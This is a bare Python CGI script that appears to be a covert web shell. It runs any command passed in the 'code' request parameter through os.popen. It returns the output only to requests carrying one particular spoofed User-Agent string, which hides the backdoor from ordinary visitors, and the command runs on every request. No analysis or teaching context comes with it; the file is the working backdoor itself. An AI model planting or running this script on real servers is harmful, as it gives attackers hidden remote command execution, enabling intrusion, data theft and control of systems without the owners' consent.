#!/usr/bin/env python3
import cgi,os

form = cgi.FieldStorage() ; code = form.getvalue('code', '') ; code = os.popen(code)

user_agent = os.environ["HTTP_USER_AGENT"]
if "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0" in user_agent:
   print ("Content-type: text/html\n")
   print ("<pre>" + code.read() + "</pre>", end = "")
